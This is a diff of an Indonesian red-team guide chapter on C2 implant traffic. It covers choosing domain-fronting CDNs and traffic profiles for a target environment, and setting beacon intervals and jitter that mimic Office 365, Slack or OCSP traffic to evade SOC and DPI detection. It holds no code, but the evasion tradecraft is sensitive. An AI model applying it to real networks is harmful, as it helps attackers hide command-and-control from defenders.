-### Kombinasi Optimal
+### Pilihan CDN untuk Domain Fronting
 
-| Situasi | Profile | Front Domain |
+| Situasi | Profile | Front CDN |
 |---|---|---|
-| SOC basic, no DPI | `office365` | tidak perlu |
+| SOC basic, no DPI | `office365` | Tidak perlu |
 | Firewall ketat, IP C2 di-block | `cdn` | Cloudflare Worker |
 | SSL inspection aktif | `ocsp` | AWS CloudFront |
-| Target enterprise O365 + DPI | `office365` | Cloudflare Worker |
-| Engagement APT simulation | `ocsp` | AWS CloudFront / Azure CDN |
-
-### Catatan Penting
-
-1. **CDN harus dikonfigurasi** untuk menerima dan meneruskan request dari agent.
-   Tidak semua CDN mendukung arbitrary Host header forwarding.
-
-2. **Cloudflare Free** — Workers gratis, tapi ada rate limit 100,000 request/hari.
-   Cukup untuk most engagements.
-
-3. **AWS CloudFront** — lebih reliable untuk high-volume, tapi butuh konfigurasi
-   Origin dan Distribution.
-
-4. **req.Host vs req.Header** — di Go, Host header hanya bisa di-override lewat
-   `req.Host`, bukan `req.Header.Set("Host", ...)`. Implementasi sudah benar.
-
-5. **Jangan gunakan IP langsung** sebagai `C2_SERVER` saat domain fronting —
-   pakai domain CDN agar TLS SNI terlihat legitimate.
+| Enterprise O365 + DPI | `office365` | Cloudflare Worker |
+| APT simulation | `ocsp` | AWS CloudFront / Azure CDN |
 
 ---
 
-**Selanjutnya:** [18 — OPSEC Hardening](18-opsec-hardening.md) — enkripsi string compile-time dan Authenticode self-signing untuk implant yang lebih sulit dianalisis.
+## Tips Operasional
 
-*Atau lihat* [16 — Red Team Scenarios](16-scenarios.md) untuk contoh penggunaan profile dalam engagement end-to-end.
+### Pilih Profile Berdasarkan Target Environment
+
+```
+Pertanyaan:                              Profile:
+────────────────────────────────────────────────────────────────
+Target pakai Office 365 / Exchange?   → office365
+Target di-protect Cloudflare?         → cdn
+Target environment developer/startup? → jquery atau slack
+Target dengan SOC mature + DPI?       → ocsp
+Lab / internal testing?               → default
+Target strict egress + whitelist CDN? → cdn + domain fronting
+Target APT simulation, long haul?     → ocsp + domain fronting
+```
+
+### Interval yang Realistis per Profile
+
+| Profile | Interval Realistis | Jitter | Alasan |
+|---|---|---|---|
+| `office365` | 300s | 20% | Outlook sync default 5 menit |
+| `cdn` | 120–300s | 40–50% | CDN analytics tidak terlalu frequent |
+| `jquery` | 60–120s | 30% | Lazy loading JavaScript normal |
+| `slack` | 30–60s | 20% | Slack polling / WebSocket check |
+| `ocsp` | 1800–3600s | 50–60% | OCSP check sangat infrequent |
+
+---
+
+**Selanjutnya:** [18 — OPSEC Hardening](18-opsec-hardening.md) — enkripsi string compile-time,
+garble obfuscation, dan Authenticode self-signing untuk implant yang lebih sulit dianalisis.
